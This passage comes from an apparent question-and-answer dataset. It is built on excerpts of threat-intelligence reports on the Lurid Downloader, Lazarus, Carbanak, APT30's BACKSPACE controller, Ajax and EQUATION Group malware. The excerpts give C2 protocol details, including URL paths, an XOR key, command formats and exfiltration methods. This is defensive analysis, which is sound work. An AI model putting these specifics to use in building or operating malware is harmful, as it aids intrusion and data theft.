tasks. The main feature of the Trojan is that all communication is started by the client by http. Firewalls and other security devices will never see any communication from outside in. Even the interactive command line is built this way so everything is done from the inside out. The communication is always encrypted although it's a simple XOR single-byte encryption. This means that network security devices won't readily see anything suspicious going on.\nBig Headline: COMMUNICATION WITH THE COMMAND AND CONTROL SERVER\nWhen malware is executed on the target's system it \"checks in\" with one or more servers under the control of the attackers. Command and control mechanisms allow the threat actors to confirm that an attack has succeeded in addition to supplying them with some information about the target's computer and network. From here on, the client communicates back to the control server expecting a command, allowing the attackers to issue commands to the compromised target.\nAll of the connections to the command and control servers use the HTTP protocol and request specific URL paths. On startup, the malware connects to the command and control server and requests the path \"/trandocs/mm/\" (the path may differ with other samples, for example \"httpdocs/mm/ or /iupw82/netstate\"). This appears to be a LOGIN connection and the server always responds with \"123\". The data transmitted to the command and control server consists of the following:\nEncrypted Password/<hostname>:<MAC>/<ip address>\n<OS name>\n<codepage>:<locale>\n<actual exe name>\n<campaign name>\n<y/n> (sys32time.ini exists? Is it 1Mb or bigger?)\n<y/n> (ipop.dll exists?)\n<y/n> (always n in our samples)\n<malware version> (2.14 or 2.15)\nThe encrypted password at the beginning of the LOGIN packet only appears on version 2.15. The sample we analyzed contains the password \"hallelujah\" and it is encrypted with \"ADD +FAh\". The earlier version, 2.14, does not contain a password at all.\nAfter the initial connection, the malware makes two kinds of connections to the command and control server every 2 minutes. The first connection is a KEEPALIVE connection to the URL path \"/cgl-bin/Owpq4.cgi\". The malware posts information to the command and control server that identifies the compromised machine: OS and version, \"campaign ID\" and malware version. The second connection is an ASKCMD connection to a URL with the path \"/trandocs/mm/ <machine_name>:<MAC address>/Cmwhite\". The contents of \"Cmwhite\" contain commands that are sent by the attackers to the compromised computer. The range of possible commands will be discussed below.\nWhen the command file, \"Cmwhite\" is downloaded, the malware first acknowledges the receipt of the command by issuing an ACKCMD connection to \"/cgl-bin/Clnpp5.cgi\". Once the command is interpreted and performed, the malware issues a CMDDONE request to \"/cgl-bin/Rwpq1.cgi\". It contains the results of the command and, if relevant, a result code that indicates any error encountered. When there is no command set by the attackers for the victim computer, the command and control server returns a \"404 NOT FOUND\" error page. This is never interpreted correctly as a command and therefore ignored.\nBig Headline: COMMANDS\nThe command packet that is contained within the \"Cmwhite\" response is encrypted. In the samples we analyzed, it is encrypted with XOR 45h. Other communication packets observed suggest that there are other keys in use but they are always a single byte. Once decrypted, this is what a command packet contains:\nFirst two bytes: 40 40. (This is just a magic number).\nThird byte: Command code.\nFourth byte: Return code. (This only used in the CMDDONE packet to indicate error/success).\nFrom the Fifth byte on, the command carries parameters, which vary depending on the nature of the command.\nThe range of commands available to the attackers that are enumerated below demonstrate the level of control the attackers have over their victims. In addition to functionality that allows the attackers to send and receive files, they are able to activate an interactive remote shell on compromised systems.\nBig Headline: TOOL MARKS\nThe terms \"tool marks\" refers to characteristics contained within malware that indicate that they are part of the same campaign or related to specific threat actors8 . In this case, the attackers left the PDB path in the malware samples we analyzed which indicate the name of the project:\ne:\\programs\\LuridDownLoader\\LuridDownloader for Falcon\\DllServiceTrojan\\Release\\DllServiceTrojan.pdb e:\\programs\\LuridDownLoader\\LuridDownloader for Falcon\\ServiceDll\\Release\\ ServiceDll.pdb\nWe named this campaign of targeted attacks \"Lurid DownLoader\" based on the project name the attackers have given to their own malware.\n8 http://mobile.darkreading.com/9287/show/571d636618a7ba35b7e9bae872fc5bfd&t=ebba8420c261102635de4d20bdd772f2\nQuestion: Describe the communication protocol used by the 'Lurid Downloader' malware to interact with its command and control (C&C) server, including the types of connections and the data transmitted.",
    "output": "Answer: The 'Lurid Downloader' malware uses HTTP protocol to communicate with its C&C server. Upon execution, it makes a LOGIN connection to the server by requesting a specific URL path (e.g., '/trandocs/mm/') and transmits encrypted data including the hostname, MAC address, IP address, OS name, codepage, locale, actual executable name, campaign name, and malware version. After the initial connection, the malware makes two types of connections every 2 minutes: a KEEPALIVE connection to '/cgl-bin/Owpq4.cgi' and an ASKCMD connection to '/trandocs/mm/<machine_name>:<MAC address>/Cmwhite'. The KEEPALIVE connection posts information identifying the compromised machine, while the ASKCMD connection retrieves commands from the C&C server. The malware acknowledges receipt of commands with an ACKCMD connection and reports completion with a CMDDONE request.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.4  Links to Previous Reporting\nSome of the malware variants identified during Operation Blockbuster have been correlated to previously reported incidents and attacks, either because the malware was specifically identified in the attack, the Lazarus Group malware shared notable code overlap with the publicly reported malware, or the C2 infrastructure publicly reported was also found hard coded in malicious tools used by the Lazarus Group. Additionally, several events also had TTPs highly similar to those of the Lazarus Group and have been linked to other notable attacks by security researchers. While some of these indicators, such as overlapping C2s or some TTPs, may not be definitive proof of a linked activity, the collective picture of these events together provide a stronger link.\nThese ties strongly suggest that the Lazarus Group has been active since at least 2009, and potentially as far back as 2007, or has extensively shared resources with other closely linked groups responsible for these attacks. In the scenario that the GOP were a real organization and responsible for the SPE attack, this would suggest that SPE was not the only operation by the hacktivist group. However, Novetta's analysis and findings suggest that the SPE attack was one of several attacks attributable to the Lazarus Group, who may have posed as the pop up hacktivist collective to mislead or distract the public.\nThe Lazarus Group Timeline\nVarious security researchers have connected multi-staged attacks over a period of several years, largely against South Korean targets. Attack methods used include hard disk wiping and DDoS attacks that triggered on historically significant dates, overwriting disk content with political strings, using legitimate third-party update mechanisms to move across target networks, specific encryption and obfuscation methods, and using similar C2 structures across campaigns. We have been able to directly link several of these attacks to the Lazarus Group.\nOperation Flame and Operation 1Mission: 2007 \u2013 2012\nIssueMakersLab researchers have connected malicious activity as recent as the March 2013 DarkSeoul wiper attack to activity as far back as 2007,36 as the attackers used the same passwords, RSA encryption keys, and C2 protocol across attacks.37 Since 2012, these attackers have reportedly carried out activities under the name \"Operation 1Mission,\" based on a PDB path found in a plurality of the malware linked to identified attack activity.\nThe group behind Operation 1Mission used legitimate third-party software (an ActiveX vulnerability) as an initial infection vector, shared public RSA key across malware variants for six years, exfiltrated data and downloaded additional malware using Stage 1 C2 servers using the same primary C2 protocol and C2 code, and distributed destructive malware via Stage 2 C2 servers using altered antivirus update files. The Operation 1Mission TTPs have been reflected in multiple reported events listed in this section as well as in the Lazarus Group's malware: although we cannot confirm a link to the malware used in Operation 1Mission, Novetta has also observed shared public RSA keys across malware families, shared C2 infrastructure between unrelated families, and Stage 1 C2 servers used to distribute and download additional malware tools.\nIssueMakerLabs' analysis linking DarkSeoul to malicious activity from 2007 has also been supported by Fortinet research, which connected cyber activity from 2007, dubbed Operation Flame,38 to Operation 1Mission, Operation Troy, and the DarkSeoul attack. While the earliest compilation date for Lazarus Group malware identified by Novetta during this Operation is 2009, Novetta has directly linked Lazarus Group tools to Operation Troy and at least two other attacks that\n34  \"South Korea Detects Suspected North Korea Hacking Attempt.\" Security Week. March 27, 2014. http://www.securityweek.com/south-korea-detects-suspected-north-korea-hacking-attempt\n35  \"S. Korean military research agency kept mum about hacking.\" The Dong-A Ilbo. April 11, 2014. http://english.donga.com/List/3/all/26/408162/1\n36  \"South Korea identified who's behind the cyber attack.\" IssueMakersLabs. https://docs.google.com/file/d/0B6CK-ZBGuMe4dGVHdTZnenJMRUk/edit?pli=1\n37  \"[\ub2e8\ub3c5] 3.20 \uc0ac\uc774\ubc84\ud14c\ub7ec \uacf5\uaca9\uc8fc\uccb4, \uadf8 \uc2e4\uccb4 \ub4dc\ub7ec\ub098\ub2e4(The 3.20 cyber terrorism subject, the realities emerge)!\" boannews.com April 9, 2013. http://www.boannews.com/media/view.asp?idx=35578\n38  \"Z:\\Make Troy\\, Not War: Case Study of the Wiper APT in Korea, and Beyond.\" Fortinet. 2014. https://www.blackhat.com/docs/asia-14/materials/Yang/Asia-14-Yang-Z-Make-Troy-Not-War-Case-Study-Of-The-Wiper-APT-In-Korea-And-Beyond.pdf\nCHAPTER\nFour\n\nAnswer this question based on the above context: How did the Lazarus Group leverage legitimate third-party software in their attacks, and what implications does this have for cybersecurity strategies?",
    "output": "The Lazarus Group used legitimate third-party software, specifically an ActiveX vulnerability, as an initial infection vector. They exploited this vulnerability to gain access to target systems. This approach has significant implications for cybersecurity strategies, as it highlights the importance of securing third-party software and ensuring that all components within a network are regularly updated and patched. It also underscores the need for robust monitoring and detection mechanisms to identify unusual behavior associated with legitimate software.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "FEBRUARY 2015\nIntroduction 3\nKey findings 5\nI.\nData theft: stealing the opposition's plans 6\nII.\nVictims: serving varied roles in the opposition 9\nVictims Located in Syria and beyond 10\nIII.\nTactics: encountering femme fatale 11\nChatting with female avatars 11\nSeeding malware on social media 13\nA\nfake Syrian opposition website 13\nSocial networking profiles and Facebook credential phishing 14\nOne compromised system, multiple victims 14\nIV.\nMalware: a range of tools for multiple platforms 15\nV.\nPotential threat group sponsorship 16\nLebanon: a recurring theme 17\nConclusion 18\nAcknowledgements 18\nAppendix A: malware analysis 19\nMulti-stage self-extracting RAR dropper 19\nONESIZE Keylogger 21\nBLACKSTAR, a custom dropper for the DarkComet RAT 24\nYABROD downloader and CABLECAR launcher 26\nDetailed analysis 27\nPython-based backdoor shellcode launcher 28\nAndroid backdoors 30\nMalware samples 34\n1 John Scott Railton is a Research Fellow at the Citizen Lab, Munk School of Global Affairs, University of Toronto and a PhD Student at UCLA\nten armed units working in opposition to Syrian\nPresident Assad's regime were planning a major operation intended to push a front forward against the Syrian government's forces. They carefully laid out their objective\u2014take and hold a series of positions and liberate the town of Khirbet Ghazaleh, a strategic gateway to the major city of Daraa. They used Google Earth to map their defensive lines and communicate grid coordinates.\nThey shared photocopied battle plans and in red ballpoint pen added defensive berms, saving their plans electronically as pictures. They planned for a battle involving between 700 and 800 opposition forces, who were divided into groups to launch separate attacks, including an ambush. They mapped out locations for reserve fighters, staging areas, and support personnel, settled on a field operations area, and planned supply routes to resource their forces. They sternly told commanders of each unit that they could make no 'individual' decisions without the approval of the Operations element.\nthe attack with a barrage of 120mm mortar fire, followed by an assault against key regime troop locations. They drew up lists of men from each unit, with names, birthdates, and other identifying information. They used formulas in a colorful Excel spreadsheet to calculate per-man ammunition needs. They arranged and assigned heavier weapons to various engagements: several tanks, a BMP fighting vehicle, 14.5mm and 23mm anti-aircraft guns, B-10 82 mm recoilless rifles, Yugoslav 90mm M79 Osa anti-tank weapons and other equipment.\nFinally, they prepared and staffed medical teams and battlefield ambulances. They would have a driver, stretcher-bearer, and two armed elements for additional support.\nWe uncovered these battle plans in the course of our ongoing threat research. It quickly became apparent that we had come across stolen documents containing the secret communications and plans of Syrian opposition forces that had fallen victim to a well-executed hacking operation. Between at least November 2013 and January 2014, the hackers stole a cache of critical documents and Skype conversations revealing the Syrian opposition's strategy, tactical battle plans, supply needs, and troves of personal information and chat sessions belonging to the men fighting against Syrian President Bashar al-Assad's forces. While we do not know who conducted this hacking operation, if this data was acquired by Assad's forces or their allies it could confer a distinct battlefield advantage.\nTo undertake this operation, the threat group employed a familiar tactic: ensnaring its victims through conversations with seemingly sympathetic and attractive women. A female avatar would strike up a conversation on Skype and share a \"personal\" photo with her target. Before sending the photo she typically asked which device the victim was using\u2014an Android phone or a computer\u2014likely in an effort to send appropriately tailored malware. Once the target downloaded the malware-laden photo, the threat group accessed his device, rifled through files and selected and stole data identifying opposition members, their Skype chat logs and contacts, and scores of documents that shed valuable insight into military operations planned against President Assad's forces.\n\nQ: What types of sensitive information were stolen by the threat group during the Syria conflict APT operation, and how might this information have conferred a battlefield advantage to Assad's forces or their allies?",
    "output": "A: During the Syria conflict APT operation, the threat group stole a variety of sensitive information, including secret communications, tactical battle plans, supply needs, and personal information of the Syrian opposition forces. This information included detailed battle plans with grid coordinates, lists of opposition members with identifying information, and chat sessions. If this data was acquired by Assad's forces or their allies, it could have conferred a distinct battlefield advantage by providing insights into the opposition's strategies, planned operations, and the identities of key personnel involved.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. Executive Summary\nFrom late 2013 onwards, several banks and financial institutions have been attacked by an unknown group of cybercriminals. In all these attacks, a similar modus operandi was used. According to victims and the law enforcement agencies (LEAs) involved in the investigation, this could result in cumulative losses of up to 1 billion USD. The attacks are still active.\nThis report provides a technical analysis of these attacks.\nThe motivation for the attackers, who are making use of techniques commonly seen in Advanced Persistent Threats (APTs), appears to be financial gain as opposed to espionage.\nAn analysis of the campaign has revealed that the initial infections were achieved using spear phishing emails that appeared to be legitimate banking communications, with Microsoft Word 97 \u2013 2003 (.doc) and Control Panel Applet (.CPL) files attached. We believe that the attackers also redirected to exploit kits website traffic that related to financial activity.\nThe email attachments exploit vulnerabilities in Microsoft Office 2003, 2007 and 2010 (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE-2014-1761). Once the vulnerability is successfully exploited, the shellcode decrypts and executes the backdoor known as Carbanak.\nCarbanak is a remote backdoor (initially based on Carberp), designed for espionage, data exfiltration and to provide remote access to infected machines. Once access is achieved, attackers perform a manual reconnaissance of the victim's networks. Based on the results of this operation, the attackers use different lateral movement tools in order to get access to the critical systems in the victim\u00b4s infrastructure. They then install additional software such as the Ammyy Remote Administration Tool, or even compromise SSH servers. Notably, some of the latest versions of the analyzed Carbanak malware appear not to use any Carberp source code.\nOnce the attackers successfully compromise the victim\u00b4s network, the primary internal destinations are money processing services, Automated Teller Machines (ATM) and financial accounts. In some cases, the attackers used the Society for Worldwide Interbank Financial Telecommunication (SWIFT) network to transfer money to their accounts. In others, Oracle databases were manipulated to open payment or debit card accounts at the same bank or to transfer money between\naccounts using the online banking system. The ATM network was also used to dispense cash from certain ATMs at certain times where money mules were ready to collect it.\nAs part of the attack\u00b4s reconnaissance phase, video recordings of the activities of bank employees, particularly system administrators, were made. The videos were sent to the C2 server.\nPlease note that the attackers abused the aforementioned services by impersonating legitimate local users who had the permissions to perform the actions later reproduced by the cybercriminals. As far as we know, none of the aforementioned services were attacked nor was any specific vulnerability within them exploited.\nOf the 100 banking entities impacted at the time of writing this report, at least half have suffered financial losses, with most of the victims located in Russia, USA, Germany, China and Ukraine. The magnitude of the losses is significant. For example, one victim lost approximately $7.3 million (USD) due to ATM fraud; another suffered a $10 million (USD) loss due to the exploitation of its online banking platform.\nStolen funds were transferred out of the affected countries to bank accounts in the US and China. Additionally some of the C2 servers have log entries indicating connections to systems located in the US. Telemetry indicates that the attackers are expanding operations to other regions, such as Asia, the Middle-East, Africa and Europe.\nThis report discusses the attack vectors, infection mechanisms and toolkits used by the attackers to exploit the network after the initial infection, as well as the operational details and geographical distribution of this campaign.\n\nAnswer this question based on the above context: After gaining access to the victim's network, what strategies did the Carbanak APT group employ to compromise critical systems and exfiltrate funds? How did they ensure successful execution of their financial fraud schemes?",
    "output": "After gaining access to the victim's network, the Carbanak APT group performed manual reconnaissance to understand the network layout. They used various lateral movement tools to access critical systems such as money processing services, Automated Teller Machines (ATMs), and financial accounts. They installed additional software like the Ammyy Remote Administration Tool or compromised SSH servers. The attackers targeted the SWIFT network for money transfers, manipulated Oracle databases to create new accounts or transfer funds, and used the ATM network to dispense cash at predetermined times. Video recordings of bank employees' activities were made during the reconnaissance phase and sent to the C2 server. The attackers impersonated legitimate local users with necessary permissions to perform unauthorized actions without exploiting specific vulnerabilities in the targeted services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Suggests Target Prioritization and Shift Work\nAdditional information about APT30's operations can be inferred by examining the GUI controller used to manage their BACKSPACE backdoors. FireEye analyzed three copies of the BACKSPACE controller software, known as the \"NetEagle Remote Control System\" 6 (according to the version information from one sample) or \u7f51\u7edc\u795e\u9e70\u8fdc\u7a0b\u63a7\u5236\u7cfb\u7edf (according to the \"About\" dialog box). Although the copies we analyzed were compiled in 2010, 2011, and 2013 respectively, the tool's descriptions indicate the original controller software may have been developed as early as 2004.7\nThe BACKSPACE controller is a well-developed, full-featured GUI tool. The controller includes main menu items for \"System\", \"Network\", \"File\", \"Remote\", and \"Attack\" operations, in addition to the \"About\" dialog box. Information about victim hosts connected to the controller is displayed in the lower panes, including the hostname, internal and external IP addresses, system uptime, and OS version and language.\nMany of APT30's tools perform version checks and attempt to self-update.\nSmall Headline: ESTABLISHING REMOTE CONTROL\nCommunication with the stage two C2 server (e.g., the BACKSPACE controller) is managed via two files hosted on the stage one C2 server, dizhi.gif and connect.gif. BACKSPACE victim computers will retrieve dizhi.gif and transmit information about the victim computer (via HTTP POST) to the second stage IP address and port specified in that file. This victim information is used to populate the controller GUI (see Figure 4). However, BACKSPACE clients do not establish interactive connections to the BACKSPACE controller by default, as this would increase the risk of exposing the second-stage C2 server.\nWhen a threat actor wants to establish remote control over a victim host, he uploads a notification file (e.g., connect.gif) containing the victim hostname and host ID number to the stage one C2 server. Victim hosts will parse the connect.gif file retrieved from the server and connect to the BACKSPACE controller (using the data from dizhi.gif) if their hostname and host ID are present in the file.\nBoth dizhi.gif and connect.gif are generated by the BACKSPACE controller based on user-defined configuration settings and automatically uploaded to the stage one C2 server. This simplifies management of victim computers, reduces the risk of configuration errors, and allows even relatively unskilled operators to manage C2 infrastructure and victim hosts.\nThe screen shot below shows the configuration options for the two files, including the FTP credentials used to connect to the stage one server, the path for the files, the names of the files, and the primary and backup stage one C2 servers. These same configuration settings are used to customize a copy of the BACKSPACE malware, by \"patching\" the relevant bytes within the BACKSPACE binary.\nSimilarly, a second dialogue box allows the threat actor to specify the ports (listed in dizhi.gif) used for communication with the second stage C2 server/BACKSPACE controller. The first port is used to transmit victim data via HTTP POST. The second port is used to establish an interactive connection with the BACKSPACE controller. The third port is used for a reverse command shell between the controller and the victim.\nDouble-clicking an idle victim in the BACKSPACE controller GUI will automatically create (or update) connect.gif with that victim's hostname and host ID and upload the new file to the stage one C2 server. The next time the victim parses the file, it will establish a connection to the controller.\nSmall Headline: BACKSPACE CONTROLLER \u2013 BACKDOOR COMMUNICATION\nThe BACKSPACE controller uses a modified HTTP protocol to communicate with BACKSPACE clients on victim hosts. Victim hosts send data to the controller in HTTP POST format. When the controller receives the data, it ignores other HTTP headers and only parses the Content-Length value and the body data. No acknowledgement packet is sent back to the backdoor.\nThe BACKSPACE controller sends remote command messages to BACKSPACE clients in the format below, disguised as a response from a Microsoft IIS 6.0 server. Similar to the controller, the BACKSPACE client only parses the Content-Length field and the remote command stored in the body and ignores other HTTP headers.\nSmall Headline: TARGET HOST PRIORITIZATION AND ALERTS\nThe BACKSPACE controller allows the threat actors to further manage their victim hosts by labeling individual hosts with a comment, assigning a priority level to the victim (\"Normal\", \"Important\", or \"Very Important\"), and setting an alert to notify the threat actor when the victim host comes online.\nAPT30 assigns a priority level to their victims: \"Normal,\" \"Important,\" and \"Very Important.\"\nHTTP/1.1 200 OK\nServer: Microsoft-IIS6.0\nContent-Length: 12\nContent-Type: */*\nAccept-Ranges: bytes\nConnection: Keep-Alive\nSmall Headline: EXECUTING CUSTOM TASKS\nThe BACKSPACE controller includes a menu item called \"Automatically Execute Custom Task\" (highlighted below) which sends the 'O' command supported by some variants of the BACKSPACE backdoor.8 When the backdoor receives this command, it uploads data to the controller from predefined paths on the victim host ($LDDATA$\\ and %WINDIR%\\$NtUninstallKB900727$\\). This special command appears to be used to retrieve  stolen data from the victim computer in an automated fashion (as opposed to manually uploading files or directories). Of note is that these paths are found in other tools used by APT30 (specifically SPACESHIP and FLASHFLOOD) believed to be used to target air-gapped computers and networks.9\nBelow the \"Automatically Execute Custom Task\" menu item is another custom option for \"GOTO custom path\". When selected, that menu item also directs the operator to a predefined custom path (one used by some versions of FLASHFLOOD) by default:\nSmall Headline: DISK SERIAL NUMBER AUTHENTICATION\nThe BACKSPACE controller also includes a check to ensure that the controller is only run on authorized machines. The controller compares the local host's hard disk serial number with 45 encoded serial numbers hardcoded within the controller binary, and continues execution only if there is a match. This indicates that the developers of the controller wanted to limit its distribution and use. The developers could have written the controller for themselves; alternately, the controller could have been sold with built-in restrictions so the developers could continue to write and sell custom versions to others.10  Given the tightly integrated nature of much of APT30's malware (with each other and with the controller) and the fact that the controllers themselves use APT30 domains to perform self-update checks, it seems more likely that APT30 (or a group of developers closely aligned with them) created the controller for their own use.\nSmall Headline: APT30 POSSIBLY WORKING ON SHIFTS\nIn our analysis of the BACKSPACE controller, we identified a dialog box in the portable executable (PE) resource section. The dialog box included a login prompt with the text\u8bf7\u8f93\u5165\u60a8\u7684\u503c\u73ed\u5458\u4ee3\u53f7, which translates to \"Please enter your attendant code\". This suggests the tool may have been designed to track work shifts amongst multiple operators, although this particular feature was disabled in the sample we analyzed.\nThe history of the BACKSPACE controller (possibly written as early as 2004, and still compatible with BACKSPACE variants compiled within the past year) reflects a tool developed over time and designed to facilitate detailed interaction with victim hosts through a relatively simple interface. The tool is capable of supporting interaction with a large number\nof victim hosts, and includes features to allow the operator to filter, prioritize, alert on, and otherwise manage his or her victims, implying operations large enough to warrant such features. The controller exhibits the same diligent version control and self-updating features observed in other malware used by APT30. In addition, the serial number checks built in to the BACKSPACE controller imply a very limited distribution tool designed to be used by only a select number of users. Finally, the \"attendant\" dialog box implies that the controller itself may have been designed for use in a highly organized environment. All of these factors point to a threat group with long-term, organized, and structured development resources; a need to manage and track a potentially large number of victims over time; and an organized work force responsible for carrying out the group's objectives.\n\nWhat features of the BACKSPACE controller suggest that APT30 operates in a highly organized and structured manner, and how do these features contribute to their operational efficiency?",
    "output": "Several features of the BACKSPACE controller suggest that APT30 operates in a highly organized and structured manner. Firstly, the controller allows threat actors to label individual hosts with comments, assign priority levels ('Normal', 'Important', or 'Very Important'), and set alerts to notify when a victim host comes online. This prioritization helps in managing a large number of victims efficiently. Secondly, the controller includes a dialog box with a login prompt that translates to 'Please enter your attendant code,' suggesting the tool may have been designed to track work shifts among multiple operators, indicating a collaborative environment. Lastly, the controller exhibits diligent version control and self-updating features, reflecting a long-term, organized development effort. These features collectively contribute to operational efficiency by enabling detailed interaction with victim hosts, facilitating collaboration, and ensuring the tool remains up-to-date.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Ajax/ FLYING KITTEN/ Saffron Rose\nThe Ajax group began in 2010 with website defacement attacks, but their activity escalated to cyber-espionage by 2013. The group's C&C infrastructure was set to Iran Standard Time and used the Persian language. The Ajax team consists of 5-10 members and it is unclear if the group is part of a larger movement such as the Iranian Cyber Army. The group may have been founded by members using the monikers \"HUrr!c4nE!\" and \"Cair3x.\" The group uses custom malware, but they do not leverage software exploits. The lack of exploits indicates that the group is more likely a patriotic hacktivist group than a state sponsored threat.\nAjax primarily targets United States defense contractors, firms that developed technologies that bypassed the Iranian censorship policies, and Iranian dissidents. The group has also participated in attacks against Israel with the Anonymous group.\nThe group tries to lure victims into revealing login credentials or self-installing malware through basic social engineering instead of leveraging software exploits. These social engineering attacks proceed through email, instant messages, private messages on social media, fake login pages, and anti-censorship technology that has been pre-loaded with malware. Past messages have directed targets to a fake login or conference page. The page spoofs a legitimate organization or application and it collects user login credentials. After the user logs in, they are directed to a different page that tells users that their browser is missing a plugin or that they need to install proxy software, which is actually the malware. In some cases, the messages just send the user to the latter page. Iranian Internet Service Providers (ISPs) block \"unacceptable content\" such as pornography or sources of political dissidence. Ajax team has been infecting anti-censorship software, such as Psiphon and Ultrasurf, with malware and redistributing it.\nAjax relies on the Stealer malware which consists of a backdoor and tools. Using one tool, the attackers can create new backdoors and bind them to legitimate applications. Stealer collects system data, logs keystrokes, grabs screenshots, collects credentials, cookies, plugin information, and bookmarks from major browsers, and collects email and instant messenger information along with any saved conversations. Stealer also has components that acquire Remote Desktop Protocol (RDP) accounts from Windows vault and collects user browsing history. Data is encrypted using symmetric encryption (AES-256) using a hardcoded encryption key. The information is then exfiltrated using FTP with a built in client (AppTransferWiz.dll).\nA new version of the Stealer malware, dubbed Sayad, surfaced in July 2014. The variant includes a dropper called Binder and new communication modules that allow it to exfiltrate data using HTTP POST requests. Binder checks the .NET runtime version of the target machine and drops the relevant version of the malware. The malware is now more modular and contains development files suggesting the future capability to exfiltrate files from the target system.\n\nAnswer this question based on the above context: Why did the Ajax group shift their tactics from website defacement to cyber-espionage, and what specific targets did they focus on? Explain how this shift reflects their motivations and capabilities.",
    "output": "The Ajax group shifted their tactics from website defacement to cyber-espionage starting in 2013. This escalation indicates a change in their objectives and capabilities. Their primary targets included United States defense contractors, firms developing technologies to bypass Iranian censorship policies, and Iranian dissidents. Additionally, they participated in attacks against Israel alongside the Anonymous group. This shift reflects a more focused and strategic approach, possibly driven by patriotic motives rather than state sponsorship, as they do not leverage software exploits but rely heavily on social engineering techniques.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: EQUATION Group\nWith operations predating at least 2001, EQUATION group is one of the most persistent and arguably, the most sophisticated threat groups in operation. EQUATION Group was discovered during Russian cyber-security firm, Kaspersky's investigation into the Regin threat group. Kaspersky attributes EQUATION Group to the United States National Security Agency; however, definitive evidence of attribution remains absent. EQUATION group's name derives from their employment of encryption and obfuscation strategies throughout their operations. The RC5 encryption algorithm is deployed throughout the malware and additional encryption algorithms RC6, RC4, and AES are added in other modules. Some of the attribution of the group to the United States comes from similarities between the malware platform and exploits to Stuxnet and the Gauss malware.\nEQUATION Group has globally targeted more than 500 victims in over 30 countries including Iran, Russia, Syria, Afghanistan, Kazakhstan, Belgium, Somalia, Hong Kong, Libya, United Arab Emirates, Iraq, Nigeria, Ecuador, Mexico, Malaysia, United States, Sudan, Lebanon, Palestine, France, Germany, Singapore, Qatar, Pakistan, Yemen, Mali, Switzerland, Bangladesh, South Africa, Philippines, United Kingdom, India and Brazil. Targets are affiliated with government institutions, diplomatic organizations, the telecommunication sector, aerospace firms, energy companies, nuclear research facilities, oil and gas companies, military systems, nanotechnology research facilities, Islamic activists and scholars, mass media outlets, the transportation sector, financial institutions, and companies developing cryptographic technologies. It is possible that even more infections remain undiscovered. Kaspersky estimates that EQUATION Group attacked 2000 targets per month in 2008; although, the estimate seems generous. EQUATION Group's known C&C infrastructure spans more than 300 domains on over 100 servers.\nThe EQUATION Group compromises systems by using zero-day exploits, by infecting physical media (USB stick, CDs, etc.), through web-based exploits, through the self-replicating Fanny worm, and through robust customized malware platforms. The zero day exploits targeted Microsoft Windows, Internet Explorer, Java, the Firefox 17 browser, and the TOR browser. Attacks incorporating infected physical media utilize interdiction, a technique where an attacker intercepts shipped goods, such as software, and replaces it with a version containing malware or backdoors, before sending it to the buyer. EQUATION Group has been known to exploit vulnerabilities in Java on popular websites to facilitate the delivery of one of its validator-style Trojans, DOUBLEFANTASY and TRIPLEFANTASY. The Fanny worm was created around 2008 and it was used to gather information from targets in the Middle East and Asia. According to Kaspersky, 59.36% of Fanny infections were in Pakistan, 15.99% of Fanny infections were in Indonesia, 14.17% of Fanny infections were in Vietnam, and 4.05% of Fanny\ninfections were in China. Networks are typically infected with the Fanny worm via infected physical media. Fanny resembles Stuxnet in operation, but it may actually predate Stuxnet and tie the EQUATION Group to the Stuxnet Group. Some variations of Fanny feature the Stuxnet LNK exploit and other exploits that were deployed in Stuxnet, and the Flame malware; however, it appears that the exploits were used in the Fanny worm prior to their inclusion in Stuxnet or Flame. Considering that Stuxnet and Flame were so effective because they employed zero-day exploits that were unknown to the public, there is merit to the theory that Stuxnet was created by or in collusion with the developer of the Fanny worm. Fanny is used to map air-gapped networks. USB devices (and other writable media) that are plugged into infected systems, are corrupted to store Fanny in a self-hidden partition. When the device is plugged into an air-gapped system, say for updates, basic system information or data is stored in the hidden partition. The information is exfiltrated to a C&C server the next time the device is plugged into a system with an internet connection. EQUATION Group can also store commands on the device while it is connected to the internet. Fanny will execute the commands the next time the device is connected to the air-gapped system. This process allows the group to map the network infrastructure and it allows the group to compromise air-gapped systems, which tend to contain more sensitive information. These systems are often less defended because their administrators equate their isolation to security.\nThe EQUATION Group developed unique malware and malware platforms. Typically, a zero-day exploit or a web exploit was used for the initial compromise of the target system. Next, a validator-style Trojan, dubbed DOUBLEFANTASY scans the infected system and uses input criteria to determine if the host is the intended system or if the characteristics of the system indicate that its data would be interesting to the attacker. DOUBLEFANTASY acts as a backdoor into the target system. If the target matches the criteria, then a malware platform, EQUATIONLASER, EQUATIONDRUG, or GRAYFISH is delivered and installed on the system. For example, in one campaign, EQUATION Group exploited a vulnerability in the PHP script used in an online Islamic Jihadist discussion forum. However, only systems belonging to users who were logged into accounts and whose traffic originated from a specific IP address range corresponding to Jordan, Turkey, and Egypt, were infected with malware installers. More recently, DOUBLEFANTASY has been upgraded into a more robust backdoor, called TRIPLEFANTASY.\nThe EQUATIONLASER platform was used from 2001 \u2013 2003 to infect Windows 95 and Windows 98 systems. The EQUATIONDRUG platform replaced EQUATIONLASER in 2003, and was used until at least 2013. EQUATIONDRUG supports modular plugins, which can be dynamically uploaded and unloaded by remote attackers. EQUATIONDRUG installs with a cadre of modules that give full control of the operating system to the attacker. Further, it supports the addition of new plugins to increase its functionality. So far, at least 35 different\nplugins and 18 drivers have been discovered. EQUATIONDRUG was designed to compromise Windows 95, Windows 98, and Windows ME. Since the malware does not have a trusted digital signature, it may not be able to run on a modern operating system. Legacy systems, prevalent in the public sector, are still at risk. Information gathered by EQUATIONDRUG tools is stored in fake fonts folders under the Windows/ Font file directory. If EQUATIONDRUG does not receive commands from an adversarial C&C server after a specified time, usually a month or two, then it deletes itself from the system.\nSometime between 2008 and 2012, EQUATIONDRUG appears to have been phased out in favor of the GRAYFISH malware platform. GRAYFISH is the most sophisticated Equation Group malware platform discovered. Upon delivery of the installer via TRIPLEFANTASY, a GRAYFISH bootkit is injected into the registry of the operating system. When a computer first powers on, the operating system code executes (booting up) and it enables the majority of the functionality of the system. When an infected system is powered on, GRAYFISH injects code into the 